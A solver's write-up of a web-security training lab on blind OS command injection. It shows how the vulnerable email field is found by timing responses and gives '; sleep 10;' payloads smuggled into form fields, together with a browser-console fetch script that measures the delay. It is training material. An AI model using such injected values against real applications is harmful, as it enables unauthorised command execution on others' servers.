# Blind OS command injection with time delays

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.

---

## 1. Detection

- Accessed the lab and clicked on the `Submit feedback` button, which navigates to `/feedback`.
- Submitted a normal feedback form while DevTools' `Fetch/XHR` tab was open, to see how the application sends data to the backend.
- Observed the following request:

```javascript
fetch("https://0ae0004104dc453a81d7494a006e001e.web-security-academy.net/feedback/submit", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
    "content-type": "application/x-www-form-urlencoded",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"
  },
  "referrer": "https://0ae0004104dc453a81d7494a006e001e.web-security-academy.net/feedback",
  "body": "csrf=r1pAa97p7DeokzNFe6UzELK3rfQN4Ij0&name=Huzefa&email=huz%40huz.com&subject=Nice&message=Amazing",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```

- Identified five candidate fields in the body: `csrf`, `name`, `email`, `subject`, and `message`.

---

## 2. Probing Each Field

- Since the lab is blind (no command output returned in the response), used the classic command-chaining payload `; sleep 10` to try and detect injection via timing — `;` terminates the original shell command, and `sleep 10` makes the shell pause for 10,000 milliseconds.
- Tried injecting this payload into every body field one at a time:
  - `csrf=r1pAa97p7DeokzNFe6UzELK3rfQN4Ij0; sleep 10`
  - `name=Huzefa; sleep 10`
  - `email=huz@xx.com; sleep 10`
  - and so on for `subject` and `message`.
- Most fields returned no observable difference. However, injecting into the **`email`** field returned a `500 Internal Server Error`, with the response body containing `"Could not save"`.
- This was a strong signal that the `email` field was the one being passed into the shell command — likely failing because the trailing, unterminated `sleep 10` broke the rest of the original shell command syntax (e.g. an expected closing quote or argument after the email value).

---

## 3. Solve the Challenge

- Adjusted the payload to properly terminate the injected command with a trailing `;` as well, so it wouldn't break whatever shell syntax followed the email value: `email=huz@xx.com; sleep 10;`
- Used the following script in the browser console to send the request and measure the response time:

```javascript
// 1. Record the start time
const startTime = performance.now();
fetch("https://0ae0004104dc453a81d7494a006e001e.web-security-academy.net/feedback/submit", {
  "headers": {
    "accept": "*/*",
    "content-type": "application/x-www-form-urlencoded",
  },
  "body": "csrf=r1pAa97p7DeokzNFe6UzELK3rfQN4Ij0&name=User&email=user@example.com; sleep 10;&subject=Nice&message=Amazing",
  "method": "POST"
})
.then(response => {
  // 2. Record the end time when the response headers are received
  const endTime = performance.now();
  const duration = endTime - startTime;

  console.log(`Response received in ${duration.toFixed(2)} ms`);
  console.log(`Status: ${response.status}`);
})
.catch(error => {
  const endTime = performance.now();
  console.error(`Request failed after ${(endTime - startTime).toFixed(2)} ms`, error);
});
```

- The console logged:

```
Response received in 10549.20 ms
```

> **Why this works:** The `email` field's value is concatenated directly into a shell command on the backend without sanitization. The `;` terminates the original command, `sleep 10` executes as its own command and blocks the shell for 10 seconds, and the trailing `;` keeps the rest of the original command (whatever followed the email value) syntactically valid so the whole chain executes without erroring out. The ~10.5 second response time confirms the injected `sleep 10` was executed server-side.

- Lab solved.